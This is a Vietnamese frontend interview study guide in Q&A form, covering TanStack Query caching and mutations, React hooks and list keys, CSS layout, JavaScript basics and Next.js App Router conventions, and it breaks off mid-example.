**Q: Giải thích Stale While Revalidate pattern?**

**SWR:** Hiển thị data cũ NGAY LẬP TỨC, fetch data mới ở background.

```
Traditional: Click → Loading (2s) → Data
SWR:         Click → Data cũ ngay → Background fetch → Data mới replace
```

```jsx
const { data, isLoading, isFetching } = useQuery({...})

// isLoading: true khi KHÔNG CÓ cached data (lần đầu)
// isFetching: true khi đang fetch (kể cả background)

return (
  <>
    {data?.map(item => <Item key={item.id} />)}
    {isFetching && !isLoading && <SmallSpinner />}  {/* Background indicator */}
  </>
)
```

---

**Q: Sau khi create/update/delete, làm sao sync UI với server?**

**Strategy 1: Invalidation (Recommended)**

```js
const mutation = useMutation({
  mutationFn: (newUser) => api.createUser(newUser),
  onSuccess: () => {
    queryClient.invalidateQueries({ queryKey: ['users'] })
    // → TanStack Query tự refetch
  }
})
```

**Strategy 2: Direct cache update**

```js
const mutation = useMutation({
  mutationFn: ({ id, data }) => api.updateUser(id, data),
  onSuccess: (updatedUser) => {
    queryClient.setQueryData(['user', updatedUser.id], updatedUser)
    // → Update cache trực tiếp, không cần refetch
  }
})
```

| Situation | Strategy |
|-----------|----------|
| Create new item | Invalidation |
| Update item | Direct update hoặc Invalidation |
| Delete item | Direct update |
| Complex relationships | Invalidation |

---

**Q: Implement Optimistic Update cho Like button?**

```jsx
const likeMutation = useMutation({
  mutationFn: () => api.toggleLike(postId),

  // TRƯỚC khi gọi API
  onMutate: async () => {
    await queryClient.cancelQueries({ queryKey: ['post', postId] })

    // Snapshot để rollback
    const previousPost = queryClient.getQueryData(['post', postId])

    // Optimistic update
    queryClient.setQueryData(['post', postId], (old) => ({
      ...old,
      liked: !old.liked,
      likeCount: old.liked ? old.likeCount - 1 : old.likeCount + 1
    }))

    return { previousPost }
  },

  // Nếu FAIL → rollback
  onError: (err, variables, context) => {
    queryClient.setQueryData(['post', postId], context.previousPost)
    toast.error('Failed')
  },

  // Luôn sync với server
  onSettled: () => {
    queryClient.invalidateQueries({ queryKey: ['post', postId] })
  }
})
```

**Flow:** Click → UI update ngay → API call → Success: confirm / Fail: rollback

---

**Q: Dependent Queries - Fetch theo thứ tự?**

Dùng `enabled` option:

```jsx
// Query 1: Fetch user
const userQuery = useQuery({
  queryKey: ['user', userId],
  queryFn: () => api.getUser(userId)
})

// Query 2: Chỉ fetch orders KHI có user
const ordersQuery = useQuery({
  queryKey: ['orders', userQuery.data?.id],
  queryFn: () => api.getOrders(userQuery.data.id),
  enabled: !!userQuery.data  // false → không chạy
})
```

---

**Q: Pagination vs Infinite Scroll - Khi nào dùng?**

| Use case | Pattern |
|----------|---------|
| Admin dashboard, data tables | Pagination |
| Social feed, comments, chat | Infinite Scroll |

**Pagination:**

```jsx
const [page, setPage] = useState(1)

const { data, isPlaceholderData } = useQuery({
  queryKey: ['users', page],
  queryFn: () => api.getUsers(page),
  placeholderData: keepPreviousData,  // Giữ data cũ khi chuyển trang
})
```

**Infinite Scroll:**

```jsx
const { data, fetchNextPage, hasNextPage } = useInfiniteQuery({
  queryKey: ['feed'],
  queryFn: ({ pageParam = 1 }) => api.getFeed(pageParam),
  getNextPageParam: (lastPage) => lastPage.nextCursor ?? undefined,
})

// Auto fetch khi scroll đến cuối
useEffect(() => {
  if (inView && hasNextPage) fetchNextPage()
}, [inView, hasNextPage])
```

---

**Q: Error Handling trong TanStack Query?**

**Per-query:**

```js
const { isError, error } = useQuery({
  queryKey: ['users'],
  queryFn: getUsers,
  retry: 3,
  retryDelay: (attempt) => Math.min(1000 * 2 ** attempt, 30000),
})
```

**Global:**

```js
const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      retry: 2,
      onError: (error) => {
        if (error.status === 401) redirect('/login')
        else toast.error(error.message)
      }
    }
  }
})
```

---

**Tóm tắt câu hỏi TanStack Query:**

| Topic | Key Point |
|-------|-----------|
| Caching | staleTime = when to refetch, gcTime = when to remove |
| Query Key | Include all dependencies, hierarchical structure |
| SWR | Show stale immediately, refetch background |
| Mutation | Invalidation vs Direct update |
| Optimistic | onMutate snapshot → update → onError rollback |
| Dependent | enabled option |
| Pagination | keepPreviousData |
| Infinite | useInfiniteQuery + getNextPageParam |
| Error | Per-query, Global, Error Boundary |

---

#### Q9: Debug infinite re-render

**Answer:**

**Bước 1 - Detect:**

- React DevTools → "Highlight updates when components render"
- Profiler → xem component nào render, bao nhiêu lần
- `why-did-you-render` library

**Bước 2 - Nguyên nhân phổ biến:**

```jsx
// 1. Object/array mới mỗi render trong dependency
useEffect(() => {
  fetchData(options);
}, [{ page: 1 }]); // ❌ Object mới mỗi lần → infinite loop

// 2. setState trong useEffect không có đúng deps
useEffect(() => {
  setCount(count + 1); // ❌ Infinite loop
}, [count]);

// 3. Function tạo mới mỗi render
<Child onClick={() => handleClick()} />; // ❌ Child re-render liên tục
```

**Bước 3 - Fix:**

- `React.memo` wrap child components
- `useMemo` / `useCallback` cho stable references
- Kiểm tra dependency arrays

---

#### Q10: System Design - Real-time Dashboard

**Answer:**

**Approach:**

- **SSE (Server-Sent Events)** cho one-way data flow (server → client) - phù hợp cho dashboard
- **WebSocket** nếu cần two-way communication

**Optimization với useRef:**

```jsx
const dataRef = useRef(initialData);

useEffect(() => {
  const eventSource = new EventSource("/api/metrics");

  eventSource.onmessage = (event) => {
    const newData = JSON.parse(event.data);
    // Compare trước khi update để tránh unnecessary re-renders
    if (!isEqual(dataRef.current, newData)) {
      dataRef.current = newData;
      setData(newData);
    }
  };

  return () => eventSource.close();
}, []);
```

| Approach              | Use case                                        |
| --------------------- | ----------------------------------------------- |
| SSE                   | One-way, server push (dashboard, notifications) |
| WebSocket             | Two-way (chat, collaboration)                   |
| Polling + React Query | Simple, có caching, auto-retry                  |

---

### HTML

---

#### Q11: script, script async, script defer

**Answer:**

**`<script>` (không có attribute):**

- ⏸️ **Block** HTML parsing
- Download → Execute → Rồi mới tiếp tục parse HTML

**`<script async>`:**

- Download **song song** với HTML parsing
- Execute **ngay khi download xong** (block parsing lúc execute)
- ❌ **Không đảm bảo thứ tự** giữa các scripts
- Dùng cho: analytics, ads (scripts độc lập)

**`<script defer>`:**

- Download **song song** với HTML parsing
- Execute **sau khi HTML parse xong** (trước DOMContentLoaded)
- ✅ **Đảm bảo thứ tự** theo HTML
- Dùng cho: app code, scripts phụ thuộc DOM

```
HTML:     |----parsing----|
script:   |--DL--|--exec--|----parsing----|
async:    |----parsing----|--exec--|--parsing--|
          |--DL--|
defer:    |--------parsing--------|--exec--|
          |--DL--|
```

---

#### Q12: Semantic HTML

**Answer:**

Semantic HTML là các thẻ có ngữ nghĩa trong HTML5, giúp:

1. **SEO** - Search engines hiểu content structure
2. **Accessibility** - Screen readers đọc được structure
3. **Code readability** - Developer dễ hiểu hơn `<div class="nav">`
4. **Browser features** - Reader mode, outline tự động

**Các thẻ quan trọng:**
| Tag | Ý nghĩa |
|-----|---------|
| `<header>` | Header của page/section |
| `<nav>` | Navigation links |
| `<main>` | Nội dung chính (1 per page) |
| `<article>` | Content độc lập (blog post, comment) |
| `<section>` | Nhóm content có chủ đề |
| `<aside>` | Sidebar, related content |
| `<footer>` | Footer của page/section |

---

### CSS

---

#### Q13: CSS Specificity

**Answer:**

Thứ tự ưu tiên từ **thấp → cao**:

```
element < .class < #id < inline style < !important
```

**Specificity tính theo điểm (a, b, c, d):**

| Selector                | Điểm            | Ví dụ                             |
| ----------------------- | --------------- | --------------------------------- |
| element                 | 0,0,0,1         | `div`, `p`, `h1`                  |
| .class, [attr], :pseudo | 0,0,1,0         | `.btn`, `[type="text"]`, `:hover` |
| #id                     | 0,1,0,0         | `#header`                         |
| inline style            | 1,0,0,0         | `style="..."`                     |
| !important              | Override tất cả |                                   |

**Ví dụ:**

```css
div.container #main p.text {
}
/* 1 id + 2 class + 2 element = (0,1,2,2) */
```

> **Tip nhớ:** "I-I-C-E" (Inline - ID - Class - Element)

---

#### Q14: position relative, absolute, fixed, sticky

**Answer:**

**`position: relative`**

- Vẫn chiếm chỗ trong document flow
- Dịch chuyển **so với vị trí gốc** của chính nó
- Tạo **containing block** cho absolute children

**`position: absolute`**

- **Thoát khỏi** document flow (không chiếm chỗ)
- Position theo **ancestor gần nhất có position** (relative/absolute/fixed)
- Nếu không có → position theo `<html>`

**`position: fixed`**

- Thoát khỏi document flow
- Position theo **viewport** (màn hình)
- **Không di chuyển** khi scroll

**`position: sticky`**

- **Hybrid** giữa relative và fixed
- Hoạt động như relative → đến khi scroll đến threshold → thành fixed

| Position | Flow       | Reference            | Scroll    |
| -------- | ---------- | -------------------- | --------- |
| relative | Có         | Chính nó             | Di chuyển |
| absolute | Không      | Ancestor có position | Di chuyển |
| fixed    | Không      | Viewport             | Cố định   |
| sticky   | Có → Không | Viewport khi trigger | Dính      |

---

#### Q15: Flexbox - justify-content vs align-items

**Answer:**

Flexbox layout theo **main axis** và **cross axis**, phụ thuộc vào `flex-direction`:

```
flex-direction: row (default)
├── main axis: ─── (ngang)
└── cross axis: │ (dọc)

flex-direction: column
├── main axis: │ (dọc)
└── cross axis: ─── (ngang)
```

- **`justify-content`** → căn theo **main axis**
- **`align-items`** → căn theo **cross axis**

```css
.container {
  display: flex;
  flex-direction: row;
  justify-content: center; /* căn ngang */
  align-items: center; /* căn dọc */
}
```

> **Tip:** `justify` = main axis, `align` = cross axis

---

#### Q16: CSS Grid vs Flexbox

**Answer:**

**Flexbox = 1 chiều (one-dimensional)**

- Layout theo **row** HOẶC **column**
- **Content-first**: content quyết định layout
- Tốt cho: components, navigation, card row, alignment

**Grid = 2 chiều (two-dimensional)**

- Layout theo **rows VÀ columns** cùng lúc
- **Layout-first**: layout quyết định content placement
- Tốt cho: page layout, complex grids, overlap elements

| Tình huống                  | Dùng    |
| --------------------------- | ------- |
| Items trong 1 hàng/cột      | Flexbox |
| Navigation, buttons group   | Flexbox |
| Page layout phức tạp        | Grid    |
| Cần control cả row + column | Grid    |

> **Tip:** **Grid cho layout lớn**, **Flexbox cho components bên trong**

---

#### Q17: box-sizing: border-box vs content-box

**Answer:**

**`content-box` (default):**

- `width` / `height` chỉ tính **content**
- Padding + border **cộng thêm** vào bên ngoài

**`border-box`:**

- `width` / `height` bao gồm **content + padding + border**
- Padding + border **nằm trong** kích thước đã set

```css
.box {
  width: 200px;
  padding: 20px;
  border: 2px solid black;
}

/* content-box: 200 + 40 + 4 = 244px thực tế */
/* border-box: 200px thực tế (content tự co lại) */
```

**Best practice - luôn dùng border-box:**

```css
*,
*::before,
*::after {
  box-sizing: border-box;
}
```

---

### JavaScript ES6+

---

#### Q18: var, let, const

**Answer:**

|            | var            | let              | const            |
| ---------- | -------------- | ---------------- | ---------------- |
| Scope      | Function       | Block            | Block            |
| Hoisting   | ✅ (undefined) | ✅ (TDZ → Error) | ✅ (TDZ → Error) |
| Re-declare | ✅             | ❌               | ❌               |
| Re-assign  | ✅             | ✅               | ❌ (primitive)   |

**TDZ (Temporal Dead Zone):** let/const được hoisting nhưng không thể access trước khi khai báo.

**Tại sao không dùng var:**

```js
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// Output: 3, 3, 3 ❌ (var không có block scope)

for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// Output: 0, 1, 2 ✅
```

**const với reference types:** Không thể re-assign, nhưng có thể mutate object/array bên trong.

---

#### Q19: Closure

**Answer:**

Closure là khi một function **"nhớ" lexical scope** nơi nó được định nghĩa, kể cả khi execute ở nơi khác.

```js
function createCounter() {
  let count = 0; // biến private
  return {
    increment: () => ++count,
    getCount: () => count,
  };
}

const counter = createCounter();
counter.increment(); // 1
counter.increment(); // 2
// count không thể access trực tiếp từ bên ngoài
```

**Use cases:**

1. **Private variables** (encapsulation)
2. **Currying:** `const multiply = (a) => (b) => a * b;`
3. **Event handlers với data**
4. **Redux reducer factory**
5. **React hooks** (useState, useCallback đều dùng closure)

---

#### Q20: this trong JavaScript

**Answer:**

**Regular function: `this` phụ thuộc vào cách gọi**

```js
const obj = {
  name: "John",
  greet: function () {
    console.log(this.name);
  },
};

obj.greet(); // 'John' - this = obj
const fn = obj.greet;
fn(); // undefined - this = window/global
```

**Arrow function: `this` = lexical scope (nơi định nghĩa)**

```js
const obj = {
  name: "John",
  greetDelay: function () {
    setTimeout(() => {
      console.log(this.name); // 'John' - arrow kế thừa this từ greetDelay
    }, 100);
  },
};
```

|                        | Regular function   | Arrow function           |
| ---------------------- | ------------------ | ------------------------ |
| `this`                 | Phụ thuộc cách gọi | Kế thừa từ lexical scope |
| Có thể bind/call/apply | ✅                 | ❌                       |
| Làm method             | ✅                 | ❌ Nên tránh             |
| Callback trong method  | Cần bind           | ✅ Phù hợp               |

---

#### Q21: call(), apply(), bind()

**Answer:**

Cả 3 đều dùng để **set `this`** cho function:

```js
const person = { name: "John" };

function greet(greeting, punctuation) {
  console.log(`${greeting}, ${this.name}${punctuation}`);
}
```

**`call()` - gọi ngay, arguments riêng lẻ:**

```js
greet.call(person, "Hello", "!"); // "Hello, John!"
```

**`apply()` - gọi ngay, arguments là array:**

```js
greet.apply(person, ["Hello", "!"]); // "Hello, John!"
```

**`bind()` - trả về function mới, gọi sau:**

```js
const boundGreet = greet.bind(person, "Hello");
boundGreet("!"); // "Hello, John!"
```

| Method  | Gọi ngay?        | Arguments |
| ------- | ---------------- | --------- |
| `call`  | ✅               | Riêng lẻ  |
| `apply` | ✅               | Array     |
| `bind`  | ❌ Trả về fn mới | Riêng lẻ  |

> **Trick nhớ:** **A**pply = **A**rray

---

#### Q22: == vs ===

**Answer:**

- **`==` (loose equality):** Type coercion rồi so sánh value
- **`===` (strict equality):** So sánh cả type và value

```js
1 == "1"; // true - coerce "1" thành 1
1 === "1"; // false - khác type
```

**Kết quả "bất ngờ" với ==:**

```js
0 == ''           // true
0 == false        // true
null == undefined // true
[] == false       // true
[] == ![]         // true 🤯
```

**Best practice:** Luôn dùng `===`, trừ khi check `null == undefined`.

---

#### Q23: Deep copy vs Shallow copy

**Answer:**

**Shallow copy:** Tạo object mới, nhưng **chỉ copy 1 level**. Nested objects vẫn là reference.

```js
const obj = { a: 1, b: { c: 2 } };
const shallow = { ...obj };
shallow.b.c = 200; // ẢNH HƯỞNG obj.b.c
```

**Deep copy:** Copy toàn bộ nested levels.

```js
// 1. JSON (có hạn chế - không copy Date, function, undefined, Symbol)
const deep = JSON.parse(JSON.stringify(obj));

// 2. structuredClone() - modern, recommended ✅
const deep = structuredClone(obj);

// 3. Lodash
const deep = _.cloneDeep(obj);
```

---

#### Q24: map(), filter(), reduce()

**Answer:**

Cả 3 đều **không mutate** mảng gốc:

**`map()` - transform từng element → mảng mới cùng length:**

```js
[1, 2, 3].map((n) => n * 2); // [2, 4, 6]
```

**`filter()` - lọc elements → mảng mới (có thể ít hơn):**

```js
[1, 2, 3, 4, 5].filter((n) => n > 2); // [3, 4, 5]
```

**`reduce()` - gộp thành 1 giá trị hoặc biến đổi structure:**

```js
[1, 2, 3, 4, 5].reduce((acc, n) => acc + n, 0); // 15
```

| Method   | Use case                 | Output              |
| -------- | ------------------------ | ------------------- |
| `map`    | Transform mỗi item       | Array (same length) |
| `filter` | Lọc theo điều kiện       | Array (≤ length)    |
| `reduce` | Tính toán, gộp, biến đổi | Any type            |

---

#### Q25: null vs undefined

**Answer:**

|         | `undefined`           | `null`                   |
| ------- | --------------------- | ------------------------ |
| Ý nghĩa | Chưa được gán giá trị | Intentionally empty      |
| Ai gán  | JavaScript tự động    | Developer chủ động       |
| typeof  | `"undefined"`         | `"object"` (bug lịch sử) |

**Khi nào undefined:**

```js
let x; // khai báo chưa gán
obj.foo; // property không tồn tại
function fn() {} // không return
fn(); // return undefined
```

**Khi nào null:**

```js
let user = null; // chủ động set "không có giá trị"
```

```js
null == undefined; // true (loose)
null === undefined; // false (strict)
```

---

#### Q26: Destructuring và Spread operator

**Answer:**

**Destructuring - phá vỡ cấu trúc:**

```js
// Object
const { a, b, ...rest } = { a: 1, b: 2, c: 3 };
// a=1, b=2, rest={c:3}

// Array
const [first, ...tail] = [1, 2, 3];
// first=1, tail=[2,3]

// Rename + default
const { a: alpha, d = 4 } = { a: 1 };
```

**Rest parameter (trong function) - thu gom:**

```js
const sum = (a, b, ...rest) => {
  return a + b + rest.reduce((acc, n) => acc + n, 0);
};
```

**Spread operator - trải ra:**

```js
const arr2 = [...arr1, 3, 4];
const obj2 = { ...obj1, b: 2 };
Math.max(...[1, 2, 3]);
```

---

### React

---

#### Q27: React lifecycle → Hooks

**Answer:**

**3 giai đoạn lifecycle:**

1. **Mounting** - component được render lần đầu
2. **Updating** - state/props thay đổi
3. **Unmounting** - component bị remove

**Mapping sang Hooks:**

| Class Method            | Hooks equivalent                                |
| ----------------------- | ----------------------------------------------- |
| `componentDidMount`     | `useEffect(() => {}, [])`                       |
| `componentDidUpdate`    | `useEffect(() => {}, [deps])`                   |
| `componentWillUnmount`  | `useEffect(() => { return () => cleanup }, [])` |
| `shouldComponentUpdate` | `React.memo()`                                  |

```jsx
useEffect(() => {
  // Mount + Update
  const subscription = subscribe(id);

  return () => {
    // Cleanup (trước mỗi re-run + unmount)
    subscription.unsubscribe();
  };
}, [id]);
```

---

#### Q28: Controlled vs Uncontrolled components

**Answer:**

**Controlled Component:**

- **React state** quản lý giá trị
- Cần `value` + `onChange`

```jsx
const [value, setValue] = useState("");
<input value={value} onChange={(e) => setValue(e.target.value)} />;
```

**Uncontrolled Component:**

- **DOM** tự quản lý giá trị
- Dùng `ref` để lấy giá trị

```jsx
const inputRef = useRef();
<input ref={inputRef} defaultValue="initial" />;
// Lấy giá trị: inputRef.current.value
```

|             | Controlled  | Uncontrolled |
| ----------- | ----------- | ------------ |
| Quản lý bởi | React state | DOM          |
| Validation  | Real-time   | On submit    |
| Code        | Nhiều hơn   | Ít hơn       |

> **Tip:** React recommend **Controlled** cho hầu hết cases.

---

#### Q29: useRef use cases

**Answer:**

useRef = "box" lưu giá trị mutable, persist qua renders, **KHÔNG trigger re-render**

1. **Access DOM element:**

```jsx
const inputRef = useRef();
<input ref={inputRef} />;
inputRef.current.focus();
```

2. **Lưu giá trị không cần re-render:**

```jsx
const renderCount = useRef(0);
useEffect(() => {
  renderCount.current += 1;
});
```

3. **Lưu previous value:**

```jsx
function usePrevious(value) {
  const ref = useRef();
  useEffect(() => {
    ref.current = value;
  }, [value]);
  return ref.current;
}
```

4. **Store interval/timeout ID:**

```jsx
const intervalRef = useRef();
intervalRef.current = setInterval(() => {}, 1000);
clearInterval(intervalRef.current);
```

5. **Tránh stale closure**

---

#### Q30: HOC vs Custom Hooks

**Answer:**

**HOC (Higher-Order Component):**

- Nhận component → return component mới với thêm logic

```jsx
function withAuth(WrappedComponent) {
  return function (props) {
    const isAuth = useAuth();
    if (!isAuth) return <Redirect to="/login" />;
    return <WrappedComponent {...props} />;
  };
}

const ProtectedPage = withAuth(Dashboard);
```

**Custom Hook:**

- Chia sẻ logic, return data/functions

```jsx
function useAuth() {
  const [user, setUser] = useState(null);
  useEffect(() => {
    checkAuth().then(setUser);
  }, []);
  return { user, isAuth: !!user };
}
```

|              | HOC           | Custom Hook    |
| ------------ | ------------- | -------------- |
| Return       | Component mới | Data/functions |
| Wrapper hell | Có thể        | Không          |
| Debug        | Khó           | Dễ             |

> **Trend:** Custom Hooks được ưa chuộng hơn.

---

#### Q31: React.memo, useMemo, useCallback

**Answer:**

**`React.memo`** - HOC, cache component:

```jsx
const Child = React.memo(({ data }) => <div>{data}</div>);
// Chỉ re-render khi props thay đổi
```

**`useMemo`** - cache **value**:

```jsx
const expensiveValue = useMemo(() => heavyCalculation(data), [data]);
```

**`useCallback`** - cache **function reference**:

```jsx
const handleClick = useCallback(() => {
  doSomething(id);
}, [id]);
```

|               | Mục đích                  | Cache     |
| ------------- | ------------------------- | --------- |
| `React.memo`  | Tránh re-render component | Component |
| `useMemo`     | Tránh tính toán lại       | Value     |
| `useCallback` | Stable function reference | Function  |

> **Tip:** `useCallback(fn, deps)` = `useMemo(() => fn, deps)`

---

#### Q32: Error Boundary

**Answer:**

Error Boundary giúp app không crash khi có lỗi, render fallback UI thay vì màn hình trắng.

```jsx
class ErrorBoundary extends React.Component {
  state = { hasError: false };

  static getDerivedStateFromError(error) {
    return { hasError: true };
  }

  componentDidCatch(error, errorInfo) {
    logErrorToService(error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return <h1>Something went wrong.</h1>;
    }
    return this.props.children;
  }
}
```

**Limitations - KHÔNG catch:**

- Event handlers
- Async code (setTimeout, promises)
- Server-side rendering
- Errors trong Error Boundary itself

---

#### Q33: Optimize large list (bổ sung)

**Answer:**

1. **Virtualization** - `react-window`, `react-virtuoso`
2. **Pagination / Infinite scroll**
3. **Intersection Observer** - lazy load
4. **Correct key props** - unique id, không dùng index
5. **React 18 concurrent features:**
   - `useDeferredValue` - defer re-render
   - `useTransition` - mark update as non-urgent
6. **Debounce search/filter**
7. **Lazy load images:** `<img loading="lazy" />`

---

#### Q33.5: React Key - Tại sao cần và khi nào dùng index?

**Answer:**

**Key dùng để làm gì?**

Key giúp React **identify** từng element trong list để:

1. Biết element nào **thêm/xóa/thay đổi vị trí**
2. **Preserve state** của component khi reorder
3. Tối ưu **reconciliation** (so sánh Virtual DOM)

```jsx
// React dùng key để track
<ul>
  <li key="a">Item A</li> {/* key="a" → track element này */}
  <li key="b">Item B</li>
  <li key="c">Item C</li>
</ul>
```

---

**Tại sao KHÔNG nên dùng index làm key?**

```jsx
// ❌ BAD: Dùng index
{
  items.map((item, index) => <TodoItem key={index} item={item} />);
}
```

**Vấn đề khi thêm/xóa/reorder:**

```
TRƯỚC (xóa item đầu):
index 0 → "Buy milk"     key=0
index 1 → "Walk dog"     key=1
index 2 → "Read book"    key=2

SAU (xóa "Buy milk"):
index 0 → "Walk dog"     key=0  ← React nghĩ đây vẫn là element cũ!
index 1 → "Read book"    key=1  ← Bị update sai

→ React UPDATE 2 elements thay vì DELETE 1
→ State bị lẫn lộn giữa các items
→ Input values, animations bị reset sai chỗ
```

**Demo bug thực tế:**

```jsx
function TodoList() {
  const [items, setItems] = useState([
    { text: "Buy milk" },
    { text: "Walk dog" },
  ]);

  return (
    <ul>
      {items.map((item, index) => (
        // ❌ Mỗi item có input riêng
        <li key={index}>
          <input defaultValue={item.text} />
          <button onClick={() => removeItem(index)}>X</button>
        </li>
      ))}
    </ul>
  );
}

// Nhập "Hello" vào input đầu tiên
// Xóa item đầu tiên
// → "Hello" vẫn hiện ở item đầu (lẽ ra phải mất)!
```

---

**Khi nào CÓ THỂ dùng index?**

```jsx
// ✅ OK dùng index khi THỎA CẢ 3 điều kiện:
// 1. List KHÔNG bao giờ reorder
// 2. List KHÔNG bao giờ filter/xóa ở giữa
// 3. Items KHÔNG có state (stateless display only)

// Ví dụ OK:
const staticMenu = ["Home", "About", "Contact"];
{
  staticMenu.map((item, index) => (
    <li key={index}>{item}</li> // ✅ Static, không có state
  ));
}
```

---

**Best Practice:**

```jsx
// ✅ GOOD: Dùng unique ID
{
  items.map((item) => <TodoItem key={item.id} item={item} />);
}

// Nếu không có ID, tạo khi add item:
const addItem = (text) => {
  setItems([
    ...items,
    {
      id: crypto.randomUUID(), // hoặc nanoid()
      text,
    },
  ]);
};
```

---

**Key thay đổi = Unmount + Remount:**

```jsx
// Trick: Force reset component bằng key
function UserProfile({ userId }) {
  // Khi userId đổi, muốn reset toàn bộ state
  return <ProfileForm key={userId} userId={userId} />;
}
// userId đổi → ProfileForm unmount hoàn toàn → mount mới
// → Tất cả state bên trong reset về initial
```

---

**Tóm tắt:**

| Trường hợp               | Dùng key                      |
| ------------------------ | ----------------------------- |
| Dynamic list (CRUD)      | `item.id` ✅                  |
| Static display-only list | `index` OK                    |
| Force reset component    | Thay đổi `key`                |
| Không có unique ID       | `crypto.randomUUID()` khi tạo |

> **Rule:** Khi nghi ngờ, **luôn dùng unique ID**, không bao giờ dùng index.

---

### Next.js

---

#### Q34: next/image vs img

**Answer:**

| Feature              | `<img>` | `next/image`             |
| -------------------- | ------- | ------------------------ |
| Lazy loading         | Manual  | ✅ Auto                  |
| Format (WebP/AVIF)   | Manual  | ✅ Auto convert          |
| Responsive srcset    | Manual  | ✅ Auto generate         |
| Prevent layout shift | Manual  | ✅ Required width/height |
| Placeholder blur     | Manual  | ✅ Built-in              |
| CDN caching          | Manual  | ✅ Built-in              |

```jsx
import Image from "next/image";

<Image
  src="/photo.jpg"
  width={800}
  height={600}
  placeholder="blur"
  priority // cho hero image
/>;
```

---

#### Q35: Middleware

**Answer:**

Middleware chạy **TRƯỚC mọi request** (on Edge Runtime):

```ts
// middleware.ts
import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";

export function middleware(request: NextRequest) {
  const token = request.cookies.get("token");

  if (!token && request.nextUrl.pathname.startsWith("/dashboard")) {
    return NextResponse.redirect(new URL("/login", request.url));
  }

  return NextResponse.next();
}

export const config = {
  matcher: ["/dashboard/:path*"],
};
```

**Use cases:** Auth, redirect, geolocation, A/B testing, rate limiting

---

#### Q36: next/link vs a

**Answer:**

**`next/link`** = Client-side navigation + Prefetching

| Feature                    | `<a>` | `next/link` |
| -------------------------- | ----- | ----------- |
| Full page reload           | ✅    | ❌          |
| Client-side navigation     | ❌    | ✅          |
| Prefetch on hover/viewport | ❌    | ✅ Auto     |
| Keep React state           | ❌    | ✅          |

```jsx
import Link from 'next/link';

<Link href="/about">About</Link>
<Link href="/heavy" prefetch={false}>Heavy Page</Link>
```

---

## Deep Dive: Next.js Advanced

### Next.js App Router - File Conventions

```
app/
├── layout.tsx          # Root layout (bắt buộc)
├── page.tsx            # Route "/"
├── loading.tsx         # Loading UI (Suspense boundary tự động)
├── error.tsx           # Error UI (Error boundary tự động)
├── not-found.tsx       # 404 page
├── global-error.tsx    # Error cho cả root layout
│
├── dashboard/
│   ├── layout.tsx      # Nested layout cho /dashboard/*
│   ├── page.tsx        # Route "/dashboard"
│   ├── loading.tsx     # Loading cho /dashboard
│   ├── error.tsx       # Error cho /dashboard
│   │
│   ├── settings/
│   │   └── page.tsx    # Route "/dashboard/settings"
│   │
│   └── [id]/           # Dynamic route
│       └── page.tsx    # Route "/dashboard/123"
│
├── (marketing)/        # Route Group (không ảnh hưởng URL)
│   ├── about/
│   │   └── page.tsx    # Route "/about" (không phải "/marketing/about")
│   └── blog/
│       └── page.tsx    # Route "/blog"
│
├── [...slug]/          # Catch-all route
│   └── page.tsx        # Match "/a", "/a/b", "/a/b/c"
│
└── [[...slug]]/        # Optional catch-all
    └── page.tsx        # Match "/", "/a", "/a/b"
```

---

### Routing trong Next.js App Router

#### 1. Dynamic Routes

```tsx
// app/blog/[slug]/page.tsx
export default function BlogPost({ params }: { params: { slug: string } }) {
  return <div>Post: {params.slug}</div>;
}

// URL: /blog/hello-world → params.slug = "hello-world"
```

#### 2. Nested Dynamic Routes

```tsx
// app/shop/[category]/[product]/page.tsx
export default function Product({
  params,
}: {
  params: { category: string; product: string };
}) {
  return (
    <div>
      Category: {params.category}, Product: {params.product}
    </div>
  );
}

// URL: /shop/electronics/iphone → { category: "electronics", product: "iphone" }
```

#### 3. Catch-all Segments

```tsx
// app/docs/[...slug]/page.tsx
export default function Docs({ params }: { params: { slug: string[] } }) {
  return <div>Path: {params.slug.join("/")}</div>;
}

// /docs/a → slug = ['a']
// /docs/a/b → slug = ['a', 'b']
// /docs/a/b/c → slug = ['a', 'b', 'c']
```

#### 4. Route Groups (Không ảnh hưởng URL)

```
app/
├── (auth)/
│   ├── layout.tsx      # Shared layout cho auth pages
│   ├── login/page.tsx  # Route: /login
│   └── register/page.tsx # Route: /register
│
├── (dashboard)/
│   ├── layout.tsx      # Shared layout cho dashboard
│   └── settings/page.tsx # Route: /settings
```

#### 5. Parallel Routes (@folder)

```
app/
├── @modal/
│   ├── default.tsx     # Fallback khi modal không active
│   └── login/page.tsx  # Modal content
├── layout.tsx
└── page.tsx
```

```tsx
// app/layout.tsx
export default function Layout({
  children,
  modal,
}: {
  children: React.ReactNode;
  modal: React.ReactNode;
}) {
  return (
    <>
      {children}
      {modal}
    </>
  );
}
```

#### 6. Intercepting Routes

```
app/
├── feed/
│   └── page.tsx
├── photo/
│   └── [id]/
│       └── page.tsx      # Full page: /photo/123
├── @modal/
│   └── (.)photo/         # (.) = intercept same level
│       └── [id]/
│           └── page.tsx  # Modal khi navigate từ /feed
```

**Intercepting conventions:**

- `(.)` - cùng level
- `(..)` - một level lên
- `(..)(..)` - hai levels lên
- `(...)` - từ root

---

### Nested Layouts

```tsx
// app/layout.tsx - Root Layout
export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html>
      <body>
        <Header />
        {children}
        <Footer />
      </body>
    </html>
  );
}

// app/dashboard/layout.tsx - Nested Layout
export default function DashboardLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <div className="dashboard">
      <Sidebar />
      <main>{children}</main>
    </div>
  );
}

// app/dashboard/settings/page.tsx
// Kết quả: RootLayout > DashboardLayout > SettingsPage
```

**Đặc điểm quan trọng:**

```
┌────────────────────────────────────────────────────┐
│ Root Layout (Header, Footer)                        │
│  ┌──────────────────────────────────────────────┐  │
│  │ Dashboard Layout (Sidebar)                    │  │
│  │  ┌────────────────────────────────────────┐  │  │
│  │  │ Settings Page                          │  │  │
│  │  │                                        │  │  │
│  │  └────────────────────────────────────────┘  │  │
│  └──────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────┘
```

- Layouts **persist** khi navigate giữa pages con
- State được **giữ nguyên** (không re-mount)
- Chỉ page component re-render

---

### Error Handling trong Next.js

#### 1. error.tsx - Error Boundary tự động

```tsx
"use client"; // Error component PHẢI là Client Component

export default function Error({
  error,
  reset,
}: {
